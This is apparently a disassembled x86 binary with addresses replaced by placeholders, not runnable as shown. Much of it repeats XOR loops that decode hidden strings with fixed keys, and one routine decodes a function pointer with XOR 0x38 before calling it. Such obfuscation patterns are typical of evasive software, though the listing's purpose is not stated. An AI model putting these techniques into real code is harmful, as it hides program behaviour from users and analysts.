lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x184 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x14
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x66
inc cl
mov [ ebp + eax - 0x30 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x15
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x33
inc cl
mov [ ebp + eax - 0x40 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x3c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x40 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x16
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x6c
inc cl
mov [ ebp + eax - 0x194 ] dl
movzx eax cl
cmp eax 0x3
jb r-xdata
lea eax [ ebp - 0x194 ]
mov [ ebp - 0x191 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x194 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x17
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xa9
inc cl
mov [ ebp + eax - 0x18c ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x18c ]
mov [ ebp - 0x18a ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x18c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x18
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0xdd
inc cl
mov [ ebp + eax - 0x68 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x63 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x19
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x61
inc cl
mov [ ebp + eax - 0xa8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0xa2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1a
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x86
inc cl
mov [ ebp + eax - 0x38 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1b
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x130 ]
mov eax 0x73
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x130 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
mov esi [ ebp - 0x174 ]
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1c
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xd8 ]
mov eax 0x39
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1d
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xe0 ]
mov eax 0x20
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xe0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1e
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x178 ]
mov eax 0x13
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x178 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1f
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x198 ]
mov eax 0x11
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x198 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x20
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a0 ]
mov eax 0x18
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x21
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x90 ]
mov eax 0x6e
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x22
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x100 ]
mov eax 0x65
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x23
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x128 ]
mov eax 0x61
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x24
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a8 ]
mov eax 0x10
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x25
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x19c ]
mov eax 0x79
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x19c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x26
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x98 ]
mov eax 0x27
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x27
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x118 ]
mov eax 0x4d
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x28
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xe8 ]
mov eax 0x15
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x29
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xf8 ]
mov eax 0x19
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2a
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xa0 ]
mov eax 0x42
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2b
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a4 ]
mov eax 0x3f
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a4 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2c
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x138 ]
mov eax 0x4
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x138 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2d
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x88 ]
mov eax 0x38
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2e
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x110 ]
mov eax 0x29
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2f
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x120 ]
mov eax 0xa
call sub_10040db0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x30
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x108 ]
mov eax 0x2
call sub_10040db0
mov eax edi
mov [ ebp - 0x15c ] 0xf
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x170 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp - 0x170 ]
call sub_10043190
lea ecx [ ebp - 0x170 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x31
call sub_1000dd20
cmp [ ebp - 0x15c ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x170 ]
push edx
call sub_1006591f
add esp 0x4
sub_1002eae0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1ffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
shl ecx 0x7
push ecx
call sub_10055606
add esp 0x4
test eax eax
jne r-xdata
sub_1002eb30
push esi
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_1006591f
add esp 0x4
push eax
call sub_1005cc3f
add esp 0x4
sub_1002eb77
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_1002eb98
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_10079a8a
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1007c180
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1002ec01
push 0x10
push r--data
call sub_10079bf0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1001d849
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10079c35
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_100532a0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10048313
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002eccd
mov eax [ ebp - 0x1c ]
sub_1002ece0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1002ed40
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x5
call [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_1002ed80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x120 ] 0x0
jne r-xdata
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn 0x18
push edi
push 0x208
push 0x0
push ebx
call sub_10079a10
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop esi
mov eax 0x1e
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea eax [ ebp + 0xc ]
push eax
call sub_1003b1ca
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
lea esi [ ecx + eax + 0x1082c ]
add esp 0x4
lea edi [ ebp + 0x14 ]
mov edx 0x104
mov ecx ebx
call sub_1006c890
test eax eax
js r-xdata
lea eax [ ebp + 0xc ]
push eax
call sub_1003b1ca
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ esi + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
lea esi [ ecx + edx + 0x130cc ]
add esp 0x4
lea edi [ ebp - 0x4 ]
mov edx 0x104
mov ecx ebx
call sub_1006c890
test eax eax
js r-xdata
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax 0x104
